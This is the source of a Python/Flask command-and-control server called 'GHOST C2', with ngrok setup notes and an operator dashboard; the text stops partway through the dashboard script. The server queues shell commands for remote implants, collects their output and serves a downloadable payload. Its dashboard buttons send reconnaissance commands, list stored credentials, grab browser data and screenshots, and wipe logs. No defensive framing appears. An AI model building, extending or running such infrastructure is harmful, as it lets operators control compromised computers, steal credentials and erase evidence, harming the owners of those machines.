#!/usr/bin/env python3
"""
GHOST C2 Server — direct Python / ngrok backend
Direct Python/ngrok backend — no Cloudflare Worker needed.

Usage:
  python c2_server.py [options]

  --port PORT           listen port (default 8080)
  --beacon-token TOKEN  token the implant sends in X-Beacon-Token
  --operator-token TOK  token the operator CLI / dashboard uses
  --user USER           dashboard login username
  --password PASS       dashboard login password
  --auto-accept         auto-accept all new sessions (no manual approval needed)
  --host HOST           bind address (default 0.0.0.0)

Then expose it:
  ngrok http 8080

Point the implant at the ngrok HTTPS URL.
Point c2_cli.py at the same URL with the operator token.
"""
from __future__ import annotations

import argparse, os, secrets, sys, threading, time
from collections import deque
from datetime import datetime, timezone
from functools import wraps
from typing import Any

try:
    from flask import Flask, request, jsonify, Response
except ImportError:
    sys.exit("[!] Missing: pip install flask")

# ── Tunables ──────────────────────────────────────────────────────────────────
RESULT_CAP   = 500
AUDIT_CAP    = 1000
PAYLOAD_MAX  = 32 * 1024 * 1024   # 32 MB
SESSION_TTL  = 7200                # prune sessions idle > 2 h

# ── Runtime config (overridden by CLI args) ───────────────────────────────────
_CFG: dict[str, Any] = {
    "beacon_token":   os.environ.get("GHOST_BEACON_TOKEN",   "change-me-beacon"),
    "operator_token": os.environ.get("GHOST_OPERATOR_TOKEN", "change-me-operator"),
    "dashboard_user": os.environ.get("GHOST_DASHBOARD_USER", "operator"),
    "dashboard_pass": os.environ.get("GHOST_DASHBOARD_PASS", "ghost"),
    "auto_accept":    False,
}

# ── In-memory store ───────────────────────────────────────────────────────────
_lock    = threading.RLock()
_sessions: dict[str, dict]         = {}
_tasks:    dict[str, deque[str]]   = {}
_results:  dict[str, deque[dict]]  = {}
_audit:    deque[dict]             = deque(maxlen=AUDIT_CAP)
_payload:  bytes | None            = None

# ── Flask ─────────────────────────────────────────────────────────────────────
app = Flask(__name__, static_folder=None)
app.config["MAX_CONTENT_LENGTH"] = PAYLOAD_MAX + 4096
app.config["JSON_SORT_KEYS"] = False

# ── Helpers ───────────────────────────────────────────────────────────────────
def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")

def _client_ip() -> str:
    for h in ("CF-Connecting-IP", "X-Real-IP", "X-Forwarded-For"):
        v = request.headers.get(h, "")
        if v:
            return v.split(",")[0].strip()
    return request.remote_addr or "unknown"

def _sc(a: str, b: str) -> bool:
    return secrets.compare_digest(a.encode("utf-8"), b.encode("utf-8"))

def _audit_log(action: str, detail: dict) -> None:
    with _lock:
        _audit.append({"ts": _now(), "ip": _client_ip(), "action": action, "detail": detail})

def _cors(r: Response) -> Response:
    r.headers["Access-Control-Allow-Origin"]  = "*"
    r.headers["Access-Control-Allow-Methods"] = "GET,POST,DELETE,OPTIONS"
    r.headers["Access-Control-Allow-Headers"] = "Content-Type,X-Beacon-Token,X-Operator-Token"
    return r

def _err(msg: str, status: int) -> Response:
    r = jsonify({"error": msg})
    r.status_code = status
    return _cors(r)

def _json_r(data: Any, status: int = 200) -> Response:
    r = jsonify(data)
    r.status_code = status
    return _cors(r)

# ── Auth decorators ───────────────────────────────────────────────────────────
def require_beacon(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        tok = request.headers.get("X-Beacon-Token", "")
        if not tok or not _sc(tok, _CFG["beacon_token"]):
            return _err("Unauthorized", 401)
        return fn(*a, **kw)
    return wrapper

def require_operator(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        tok = request.headers.get("X-Operator-Token", "")
        if not tok or not _sc(tok, _CFG["operator_token"]):
            return _err("Unauthorized", 401)
        return fn(*a, **kw)
    return wrapper

# ── CORS preflight ────────────────────────────────────────────────────────────
@app.route("/", defaults={"p": ""}, methods=["OPTIONS"])
@app.route("/<path:p>", methods=["OPTIONS"])
def preflight(p=""):
    r = Response("", 204)
    return _cors(r)

# ── Health ────────────────────────────────────────────────────────────────────
@app.route("/health", methods=["GET"])
def health():
    with _lock:
        count = len(_sessions)
    return _json_r({"status": "ok", "ts": _now(), "sessions": count})

# ── Beacon ────────────────────────────────────────────────────────────────────
@app.route("/beacon", methods=["POST"])
@require_beacon
def beacon():
    body = request.get_json(silent=True) or {}
    sid  = str(body.get("session", ""))[:128].strip()
    if not sid:
        return _err("Missing session", 400)

    ip = _client_ip()
    ts = _now()

    cmd_out = "sleep"
    audit_action = "beacon"
    audit_detail: dict = {"sid": sid}

    with _lock:
        existing = _sessions.get(sid)
        status   = existing["status"] if existing else ("accepted" if _CFG["auto_accept"] else "pending")
        recon    = body.get("recon") if isinstance(body.get("recon"), dict) else (existing["recon"] if existing else {})

        _sessions[sid] = {
            "session":       sid,
            "remote_ip":     ip,
            "first_seen":    existing["first_seen"] if existing else ts,
            "last_beacon":   ts,
            "recon":         recon,
            "pending_tasks": len(_tasks.get(sid, [])),
            "result_count":  len(_results.get(sid, [])),
            "status":        status,
        }

        if status == "rejected":
            cmd_out      = "exit"
            audit_action = "beacon_rejected"
        elif status == "pending":
            audit_detail["status"] = "pending"
        else:
            q = _tasks.get(sid)
            if q:
                cmd_out = q.popleft()
                _sessions[sid]["pending_tasks"] = len(q)

    _audit_log(audit_action, audit_detail)
    return _json_r({"cmd": cmd_out})

# ── Result ────────────────────────────────────────────────────────────────────
@app.route("/result", methods=["POST"])
@require_beacon
def result():
    body   = request.get_json(silent=True) or {}
    sid    = str(body.get("session", ""))[:128].strip()
    output = str(body.get("output", ""))[:65536]
    if not sid:
        return _err("Missing session", 400)

    with _lock:
        q = _results.setdefault(sid, deque(maxlen=RESULT_CAP))
        q.append({"ts": _now(), "output": output})
        if sid in _sessions:
            _sessions[sid]["result_count"] = len(q)

    return _json_r({"status": "ok"})

# ── Sessions ──────────────────────────────────────────────────────────────────
@app.route("/sessions", methods=["GET"])
@require_operator
def list_sessions():
    now_dt = datetime.now(timezone.utc)
    with _lock:
        out = []
        for s in _sessions.values():
            try:
                lb = datetime.fromisoformat(s["last_beacon"].replace("Z", "+00:00"))
                idle = int((now_dt - lb).total_seconds())
            except Exception:
                idle = 0
            out.append({**s, "idle_seconds": idle})
    return _json_r(out)

@app.route("/sessions/<path:sid>", methods=["DELETE"])
@require_operator
def kill_session(sid):
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        q = _tasks.setdefault(sid, deque())
        q.appendleft("exit")
        _sessions[sid]["pending_tasks"] = len(q)
    _audit_log("kill_session", {"session": sid})
    return _json_r({"status": "exit_queued", "session": sid})

@app.route("/sessions/<path:sid>/accept", methods=["POST"])
@require_operator
def accept_session(sid):
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        _sessions[sid]["status"] = "accepted"
    _audit_log("session_accepted", {"sid": sid})
    return _json_r({"status": "accepted"})

@app.route("/sessions/<path:sid>/reject", methods=["POST"])
@require_operator
def reject_session(sid):
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        _sessions[sid]["status"] = "rejected"
    _audit_log("session_rejected", {"sid": sid})
    return _json_r({"status": "rejected"})

# ── Task ──────────────────────────────────────────────────────────────────────
@app.route("/task", methods=["POST"])
@require_operator
def add_task():
    body = request.get_json(silent=True) or {}
    sid  = str(body.get("session", ""))[:128].strip()
    cmd  = str(body.get("cmd",     ""))[:4096].strip()
    if not sid or not cmd:
        return _err("Missing session or cmd", 400)
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        q = _tasks.setdefault(sid, deque())
        q.append(cmd)
        _sessions[sid]["pending_tasks"] = len(q)
        depth = len(q)
    _audit_log("task_queued", {"session": sid, "cmd": cmd})
    return _json_r({"status": "queued", "queue_depth": depth})

# ── Results ───────────────────────────────────────────────────────────────────
@app.route("/results/<path:sid>", methods=["GET"])
@require_operator
def get_results(sid):
    clear = request.args.get("clear") == "1"
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        entries = list(_results.get(sid, []))
        if clear:
            _results[sid] = deque(maxlen=RESULT_CAP)
            _sessions[sid]["result_count"] = 0
    _audit_log("get_results", {"session": sid, "count": len(entries), "clear": clear})
    return _json_r({"session": sid, "results": entries})

# ── Payload ───────────────────────────────────────────────────────────────────
@app.route("/payload", methods=["POST"])
@require_operator
def upload_payload():
    global _payload
    data = request.get_data()
    if not data:
        return _err("Empty body", 400)
    if len(data) > PAYLOAD_MAX:
        return _err("Payload too large (max 32 MB)", 413)
    _payload = data
    _audit_log("payload_uploaded", {"bytes": len(data)})
    return _json_r({"status": "ok", "bytes": len(data)})

@app.route("/payload", methods=["GET"])
@require_beacon
def download_payload():
    global _payload
    sid = request.headers.get("X-Session-ID", "").strip()
    if not sid:
        return _err("Missing session", 400)
    with _lock:
        if sid not in _sessions:
            return _err("Unauthorized", 401)
    if _payload is None:
        return _err("No payload stored", 404)
    _audit_log("payload_downloaded", {"sid": sid, "bytes": len(_payload)})
    return Response(_payload,
                    mimetype="application/octet-stream",
                    headers={"Content-Length": str(len(_payload)),
                             "Cache-Control": "no-store"})

# ── Audit ─────────────────────────────────────────────────────────────────────
@app.route("/audit", methods=["GET"])
@require_operator
def get_audit():
    limit = min(int(request.args.get("limit", 100)), AUDIT_CAP)
    with _lock:
        entries = list(_audit)[-limit:]
    return _json_r({"entries": entries})

@app.route("/audit/clear", methods=["POST"])
@require_operator
def clear_audit():
    with _lock:
        _audit.clear()
    return _json_r({"status": "cleared"})

# ── Auth (dashboard login) ────────────────────────────────────────────────────
@app.route("/auth", methods=["POST"])
def auth():
    body = request.get_json(silent=True) or {}
    u = str(body.get("u", ""))
    p = str(body.get("p", ""))
    if not u or not p:
        return _err("Missing credentials", 400)
    if not _sc(u, _CFG["dashboard_user"]) or not _sc(p, _CFG["dashboard_pass"]):
        _audit_log("auth_fail", {"user": u[:32]})
        return _err("Invalid credentials", 401)
    return _json_r({"token": _CFG["operator_token"]})

@app.route("/logout", methods=["GET", "POST"])
def logout():
    html = ('<!DOCTYPE html><html><head><meta charset="UTF-8">'
            '<meta http-equiv="refresh" content="0;url=/">'
            '<style>*{margin:0;padding:0}body{background:#060810;display:flex;'
            'align-items:center;justify-content:center;height:100vh;'
            'font-family:monospace;color:#484f58;font-size:12px}</style>'
            '</head><body>LOGGING OUT...</body></html>')
    return Response(html, mimetype="text/html")

# ── Dashboard HTML ────────────────────────────────────────────────────────────
_LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST C2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0c14;--surface:#10121e;--border:#1e2535;--green:#2ecc71;--red:#e74c3c;--text:#d4d8e8;--muted:#5a6178;--mono:'Consolas','Courier New',monospace}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono)}
body{display:flex;align-items:center;justify-content:center;min-height:100dvh}
.box{width:360px;border:1px solid var(--border);background:var(--surface);padding:40px 36px}
.logo{font-size:22px;font-weight:700;color:var(--green);letter-spacing:.05em;margin-bottom:4px}
.sub{font-size:13px;color:var(--muted);margin-bottom:32px}
label{display:block;font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px}
input{display:block;width:100%;background:#0a0c14;border:1px solid var(--border);color:var(--text);padding:10px 12px;font-family:var(--mono);font-size:14px;outline:none;margin-bottom:20px}
input:focus{border-color:var(--green)}
button{width:100%;background:var(--green);border:none;color:#0a0c14;padding:12px;font-family:var(--mono);font-size:14px;font-weight:700;letter-spacing:.08em;cursor:pointer;margin-top:4px}
button:hover{opacity:.9}button:disabled{opacity:.5;cursor:not-allowed}
.err{font-size:13px;color:var(--red);margin-top:14px;padding:10px 12px;border:1px solid rgba(231,76,60,.3);background:rgba(231,76,60,.06);display:none}
.err.show{display:block}
</style></head><body>
<div class="box">
  <div class="logo">GHOST C2</div>
  <div class="sub">Operator login required</div>
  <form id="f" onsubmit="login(event)">
    <label>Username</label><input id="u" type="text" autocomplete="username" required>
    <label>Password</label><input id="p" type="password" autocomplete="current-password" required>
    <button type="submit" id="sbtn">LOGIN</button>
  </form>
  <div class="err" id="err">Invalid credentials</div>
</div>
<script>
async function login(e){
  e.preventDefault();const btn=document.getElementById('sbtn');
  btn.textContent='...';btn.disabled=true;
  const r=await fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('u').value,p:document.getElementById('p').value})});
  if(r.ok){const{token}=await r.json();sessionStorage.setItem('ghost_token',token);location.href='/dashboard';}
  else{document.getElementById('err').classList.add('show');btn.textContent='LOGIN';btn.disabled=false;}
}
</script></body></html>"""

_DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST C2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0c14;--surface:#10121e;--surface2:#13162a;--border:#1e2535;
  --green:#2ecc71;--green-dim:rgba(46,204,113,.1);
  --blue:#3498db;--blue-dim:rgba(52,152,219,.1);
  --red:#e74c3c;--red-dim:rgba(231,76,60,.1);
  --yellow:#f1c40f;--orange:#e67e22;
  --text:#d4d8e8;--text2:#8892aa;--muted:#5a6178;
  --mono:'Consolas','Courier New',monospace;--accent:var(--green)}
html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:14px}
header{height:48px;display:flex;align-items:center;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0}
.hdr-logo{padding:0 20px;font-size:16px;font-weight:700;color:var(--green);letter-spacing:.08em;border-right:1px solid var(--border);height:100%;display:flex;align-items:center}
.hdr-seg{padding:0 18px;display:flex;align-items:center;gap:10px;border-right:1px solid var(--border);height:100%}
.pulse{width:9px;height:9px;border-radius:50%;background:var(--muted)}
.pulse.live{background:var(--green);animation:blink 2s ease-in-out infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.35}}
.stat-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em}
.stat-lbl.live{color:var(--green)}
.kv{display:flex;flex-direction:column;gap:1px}
.kv .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
.kv .v{font-size:15px;color:var(--text);font-weight:600}
.kv .v.dim{color:var(--muted);font-size:13px}
.kv .v.ok{color:var(--green)}
.hdr-right{margin-left:auto;padding:0 18px;display:flex;align-items:center;gap:12px}
#clock{font-size:13px;color:var(--muted2,#8892aa)}
.hdr-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:6px 14px;font-family:var(--mono);font-size:13px;cursor:pointer;transition:all .15s}
.hdr-btn:hover{border-color:var(--red);color:var(--red)}
.workspace{display:flex;flex:1;height:calc(100dvh - 48px);overflow:hidden}
#sidebar{width:260px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px solid var(--border);background:var(--surface)}
.pane-head{padding:10px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--surface2)}
.pane-label{font-size:12px;color:var(--text2);text-transform:uppercase;letter-spacing:.1em;font-weight:600}
.pane-count{font-size:12px;color:var(--green);background:rgba(46,204,113,.1);padding:2px 8px;border:1px solid rgba(46,204,113,.25)}
.icon-btn{background:transparent;border:none;color:var(--muted);cursor:pointer;font-family:var(--mono);font-size:15px;padding:0 4px;line-height:1;transition:color .15s}
.icon-btn:hover{color:var(--blue)}
#session-list{flex:1;overflow-y:auto}
.no-sessions{padding:32px 16px;color:var(--muted);font-size:13px;text-align:center}
.session-item{padding:12px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .12s;border-left:3px solid transparent}
.session-item:hover{background:var(--surface2)}
.session-item.active{background:rgba(52,152,219,.06);border-left-color:var(--blue)}
.si-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.sid{font-size:13px;font-weight:700;color:var(--green);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1;min-width:0}
.sbadge{font-size:11px;padding:1px 7px;border:1px solid;flex-shrink:0;margin-left:6px}
.sbadge.live{border-color:rgba(46,204,113,.35);color:var(--green)}
.sbadge.tasks{border-color:rgba(52,152,219,.35);color:var(--blue)}
.sbadge.stale{border-color:rgba(231,76,60,.35);color:var(--red)}
.smeta{color:var(--muted);font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.6}
.smeta .hi{color:var(--text2)}
#main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
#tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;height:40px}
.tab{padding:0 20px;height:100%;display:flex;align-items:center;font-size:13px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;gap:8px}
.tab:hover{color:var(--text2)}.tab.active{color:var(--blue);border-bottom-color:var(--blue)}
.tab-badge{font-size:12px;background:var(--surface2);padding:1px 7px;border:1px solid var(--border);color:var(--muted)}
.tab.active .tab-badge{background:rgba(52,152,219,.12);border-color:rgba(52,152,219,.3);color:var(--blue)}
#session-header{padding:9px 16px;border-bottom:1px solid var(--border);background:var(--surface2);display:none;align-items:center;gap:14px;flex-wrap:wrap;flex-shrink:0}
.sel-sid{font-size:14px;font-weight:700;color:var(--blue);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:300px}
.sel-meta{font-size:12px;color:var(--muted);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sel-actions{display:flex;align-items:center;gap:8px;flex-shrink:0}
#last-poll{font-size:12px;color:var(--muted);transition:color .3s}
.act-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:5px 12px;font-family:var(--mono);font-size:12px;cursor:pointer;transition:all .15s}
.act-btn:hover{border-color:var(--blue);color:var(--blue);background:var(--blue-dim)}
.act-btn.kill:hover{border-color:var(--red);color:var(--red)}
.act-btn.accept{border-color:rgba(46,204,113,.5);color:var(--green)}
.act-btn.accept:hover{background:rgba(46,204,113,.12)}
.act-btn.reject{border-color:rgba(231,76,60,.5);color:var(--red)}
.act-btn.reject:hover{background:rgba(231,76,60,.12)}
#pending-bar{padding:10px 16px;background:rgba(241,196,15,.05);border-bottom:1px solid rgba(241,196,15,.2);display:none;align-items:center;gap:12px;flex-shrink:0}
.pending-msg{font-size:13px;color:var(--yellow);flex:1}
#empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;color:var(--muted)}
.empty-msg{font-size:14px;text-transform:uppercase;letter-spacing:.15em;opacity:.5}
#output-pane{flex:1;overflow-y:auto;display:none;flex-direction:column;background:var(--bg)}
#recon-pane{flex:1;overflow-y:auto;padding:18px;display:none;background:var(--bg)}
.result-entry{border-bottom:1px solid var(--border)}
.result-entry.new-flash{animation:fi .5s ease}
@keyframes fi{0%{background:rgba(52,152,219,.1)}100%{background:transparent}}
.result-hdr{padding:6px 16px;background:var(--surface2);color:var(--muted);font-size:12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:14px}
.r-idx{color:var(--muted);font-size:12px;min-width:32px;font-weight:700}
.r-ts{color:var(--muted);flex:1}
.r-label{color:var(--blue);font-weight:700;font-size:12px;letter-spacing:.1em}
.r-len{color:var(--muted);font-size:12px}
.r-copy{background:transparent;border:none;color:var(--muted);font-family:var(--mono);font-size:13px;cursor:pointer;padding:0 4px;transition:color .15s}
.r-copy:hover{color:var(--blue)}
.result-body{padding:12px 16px 12px 48px;white-space:pre-wrap;word-break:break-word;color:var(--text);line-height:1.9;font-size:13px;position:relative}
.result-body::before{content:'';position:absolute;left:36px;top:0;bottom:0;width:1px;background:var(--border)}
.ln{display:flex;min-height:1.9em}
.ln-num{min-width:32px;text-align:right;color:var(--muted);font-size:11px;user-select:none;padding-right:10px;line-height:1.9;flex-shrink:0}
.ln-txt{flex:1;word-break:break-word}
.recon-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px}
.recon-cell{border:1px solid var(--border);padding:14px 16px;background:var(--surface2)}
.recon-key{font-size:11px;letter-spacing:.14em;color:var(--muted);text-transform:uppercase;margin-bottom:7px}
.recon-val{font-size:14px;color:var(--text);word-break:break-all;font-weight:600}
.recon-val.hi{color:var(--green)}.recon-val.warn{color:var(--yellow)}.recon-val.danger{color:var(--red)}
#cmd-bar{border-top:1px solid var(--border);background:var(--surface);display:none;flex-shrink:0}
.cmd-row{display:flex;border-bottom:1px solid var(--border)}
.cmd-prompt{color:var(--green);font-size:14px;padding:10px 14px 10px 18px;flex-shrink:0;border-right:1px solid var(--border);background:var(--surface2);user-select:none;font-weight:700}
#cmd-input{flex:1;background:transparent;border:none;color:var(--green);padding:10px 16px;font-family:var(--mono);font-size:14px;outline:none;caret-color:var(--green)}
#cmd-input::placeholder{color:var(--muted)}
.cmd-exec{background:transparent;border:none;border-left:1px solid var(--border);color:var(--muted);padding:0 18px;font-family:var(--mono);font-size:13px;cursor:pointer;transition:all .15s}
.cmd-exec:hover{color:var(--green);background:var(--green-dim)}
.quick-cmds{display:flex;gap:5px;flex-wrap:nowrap;overflow-x:auto;padding:7px 12px;scrollbar-width:thin}
.qcmd{background:transparent;border:1px solid var(--border);color:var(--muted);padding:5px 12px;font-family:var(--mono);font-size:12px;cursor:pointer;transition:all .15s;white-space:nowrap;flex-shrink:0}
.qcmd:hover{border-color:var(--blue);color:var(--blue);background:var(--blue-dim)}
#audit-panel{width:300px;flex-shrink:0;display:flex;flex-direction:column;border-left:1px solid var(--border);background:var(--surface)}
#audit-list{flex:1;overflow-y:auto}
.audit-entry{padding:10px 14px 10px 18px;border-bottom:1px solid var(--border);font-size:12px;display:flex;flex-direction:column;gap:3px;border-left:3px solid var(--border)}
.audit-entry.beacon{border-left-color:var(--green)}
.audit-entry.task_queued{border-left-color:var(--blue)}
.audit-entry.kill_session{border-left-color:var(--red)}
.audit-entry.payload_uploaded{border-left-color:var(--orange)}
.a-time{color:var(--text2);font-size:11px}
.a-action{font-weight:700;text-transform:uppercase;font-size:13px;letter-spacing:.06em}
.a-sid{color:var(--blue);font-size:12px;word-break:break-all}
.a-ip{color:var(--muted);font-size:11px}
.a-btns{display:flex;gap:6px;margin-top:6px}
.a-accept{background:transparent;border:1px solid rgba(46,204,113,.4);color:var(--green);padding:3px 12px;font-family:var(--mono);font-size:12px;cursor:pointer}
.a-accept:hover{background:rgba(46,204,113,.12)}
.a-reject{background:transparent;border:1px solid rgba(231,76,60,.4);color:var(--red);padding:3px 12px;font-family:var(--mono);font-size:12px;cursor:pointer}
.a-reject:hover{background:rgba(231,76,60,.12)}
.no-audit{padding:28px 14px;color:var(--muted);font-size:13px;text-align:center}
#toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);background:var(--surface2);border:1px solid var(--border);padding:10px 24px;font-size:13px;opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;white-space:nowrap}
#toast.show{opacity:1}
#toast.ok{border-color:rgba(46,204,113,.5);color:var(--green)}
#toast.err{border-color:rgba(231,76,60,.5);color:var(--red)}
#toast.warn{border-color:rgba(241,196,15,.5);color:var(--yellow)}
::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border)}
</style></head><body>
<header>
  <div class="hdr-logo">GHOST C2</div>
  <div class="hdr-seg"><div class="pulse" id="pulse"></div><span class="stat-lbl" id="status-txt">OFFLINE</span></div>
  <div class="hdr-seg"><div class="kv"><div class="k">NODES</div><div class="v" id="hdr-count">0</div></div></div>
  <div class="hdr-seg"><div class="kv"><div class="k">LAST BEACON</div><div class="v dim" id="hdr-beacon">—</div></div></div>
  <div class="hdr-seg"><div class="kv"><div class="k">SELECTED</div><div class="v dim" id="hdr-sel">—</div></div></div>
  <div class="hdr-right"><span id="clock"></span><button class="hdr-btn" onclick="logout()">LOGOUT</button></div>
</header>
<div class="workspace">
  <div id="sidebar">
    <div class="pane-head">
      <span class="pane-label">Nodes</span>
      <div style="display:flex;align-items:center;gap:8px">
        <span class="pane-count" id="node-count">0</span>
        <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
      </div>
    </div>
    <div id="session-list"><div class="no-sessions">Awaiting connections...</div></div>
  </div>
  <div id="main">
    <div id="tab-bar">
      <div class="tab active" data-tab="output" onclick="switchTab('output')">Output <span class="tab-badge" id="tc-output">0</span></div>
      <div class="tab" data-tab="recon" onclick="switchTab('recon')">Recon</div>
    </div>
    <div id="session-header">
      <span class="sel-sid" id="sel-sid"></span>
      <span class="sel-meta" id="sel-meta"></span>
      <div class="sel-actions">
        <span id="last-poll"></span>
        <button id="btn-accept-hdr" class="act-btn accept" style="display:none" onclick="acceptSelected()">Accept</button>
        <button id="btn-reject-hdr" class="act-btn reject" style="display:none" onclick="rejectSelected()">Reject</button>
        <button class="act-btn" onclick="clearResults()">Clear</button>
        <button class="act-btn" onclick="fetchResults()">Refresh</button>
        <button class="act-btn kill" onclick="killSession()">Kill</button>
      </div>
    </div>
    <div id="pending-bar" style="display:none">
      <span class="pending-msg">Awaiting operator approval</span>
      <button class="act-btn accept" onclick="acceptSelected()">Accept</button>
      <button class="act-btn reject" onclick="rejectSelected()">Reject</button>
    </div>
    <div id="empty-state"><div class="empty-msg">Select a node</div></div>
    <div id="output-pane"></div>
    <div id="recon-pane"></div>
    <div id="cmd-bar">
      <div class="cmd-row">
        <span class="cmd-prompt">ghost&gt;</span>
        <input id="cmd-input" placeholder="command..." onkeydown="handleKey(event)">
        <button class="cmd-exec" onclick="sendCmd()">RUN</button>
      </div>
      <div class="quick-cmds">
        <button class="qcmd" onclick="sendCmd('whoami /all')">whoami</button>
        <button class="qcmd" onclick="sendCmd('ipconfig /all')">ipconfig</button>
        <button class="qcmd" onclick="sendCmd('systeminfo')">sysinfo</button>
        <button class="qcmd" onclick="sendCmd('tasklist /v')">tasklist</button>
        <button class="qcmd" onclick="sendCmd('!ps')">ps</button>
        <button class="qcmd" onclick="sendCmd('netstat -ano')">netstat</button>
        <button class="qcmd" onclick="sendCmd('!screenshot')">screenshot</button>
        <button class="qcmd" onclick="sendCmd('net user')">net user</button>
        <button class="qcmd" onclick="sendCmd('net localgroup administrators')">local admins</button>
        <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
        <button class="qcmd" onclick="sendCmd('arp -a')">arp</button>
        <button class="qcmd" onclick="sendCmd('route print')">routes</button>
        <button class="qcmd" onclick="sendCmd('cmdkey /list')">creds</button>
        <button class="qcmd" onclick="sendCmd('!getpid')">getpid</button>
        <button class="qcmd" onclick="sendCmd('!env')">env</button>
        <button class="qcmd" onclick="sendCmd('!wipe')" style="color:var(--red);border-color:rgba(231,76,60,.4)">wipe logs</button>
      </div>
    </div>
  </div>
  <div id="audit-panel">
    <div class="pane-head">
      <span class="pane-label">Audit Log</span>
      <div style="display:flex;align-items:center;gap:8px">
        <button class="icon-btn" onclick="fetchAudit()" title="Refresh">&#x21bb;</button>
        <button class="icon-btn" onclick="clearAudit()" title="Clear" style="color:var(--red)">&#x2715;</button>
      </div>
    </div>
    <div id="audit-list"><div class="no-audit">No entries</div></div>
  </div>
</div>
<div id="toast"></div>
<script>
(function(){
  const token=sessionStorage.getItem('ghost_token');
  if(!token){location.href='/';return;}
  let selectedSid=null,currentTab='output',selectedStatus=null;
  let cmdHistory=[],cmdHistIdx=-1,lastResultCount=0,lastBeaconTs=null;

  function tick(){
    const s=new Date().toLocaleString('en-US',{timeZone:'Asia/Kathmandu',hour12:true,month:'short',day:'2-digit',year:'numeric',hour:'numeric',minute:'2-digit',second:'2-digit'});
    document.getElementById('clock').textContent=s+' NPT';
  }
  tick();setInterval(tick,1000);
  function updateBeaconAge(){
    const el=document.getElementById('hdr-beacon');
    if(!lastBeaconTs){el.textContent='—';el.className='v dim';return;}
    const secs=Math.floor((Date.now()-lastBeaconTs)/1000);
    el.textContent=fmt(secs)+' ago';el.className=secs<120?'v ok':'v dim';
  }
  setInterval(updateBeaconAge,1000);
  function toast(msg,type='ok',dur=2500){
    const el=document.getElementById('toast');
    el.textContent=msg;el.className='show '+type;
    clearTimeout(el._t);el._t=setTimeout(()=>el.className='',dur);
  }
  async function api(path,opts={}){
    try{
      const r=await fetch(path,{headers:{'Content-Type':'application/json','X-Operator-Token':token},...opts});
      if(r.status===401){toast('Session expired','err');setTimeout(logout,1500);return null;}
      return r;
    }catch(e){toast('Network error','err');return null;}
  }
  function logout(){sessionStorage.removeItem('ghost_token');fetch('/logout',{method:'POST'}).finally(()=>{location.href='/logout';});}
  window.logout=logout;

  async function refreshSessions(){
    const r=await api('/sessions');if(!r)return;
    let sessions;try{sessions=await r.json();}catch(e){return;}
    if(!Array.isArray(sessions))return;
    document.getElementById('hdr-count').textContent=sessions.length;
    document.getElementById('node-count').textContent=sessions.length;
    const pulse=document.getElementById('pulse'),stxt=document.getElementById('status-txt');
    if(sessions.length>0){
      pulse.className='pulse live';stxt.textContent='LIVE';stxt.className='stat-lbl live';
      const newest=sessions.slice().sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon))[0];
      if(newest)lastBeaconTs=new Date(newest.last_beacon).getTime();
    }else{pulse.className='pulse';stxt.textContent='IDLE';stxt.className='stat-lbl';}
    const list=document.getElementById('session-list');
    if(!sessions.length){list.innerHTML='<div class="no-sessions">Awaiting connections...</div>';return;}
    sessions.sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon));
    list.innerHTML=sessions.map(s=>{
      const idle=s.idle_seconds||0,stale=idle>180;
      const st=s.status||'pending';
      const bc=st==='pending'||st==='rejected'?'stale':s.pending_tasks>0?'tasks':stale?'stale':'live';
      const btLabel=st==='pending'?'PENDING':st==='rejected'?'REJECTED':s.pending_tasks>0?(s.pending_tasks+' tasks'):stale?('stale '+fmt(idle)):('live '+fmt(idle));
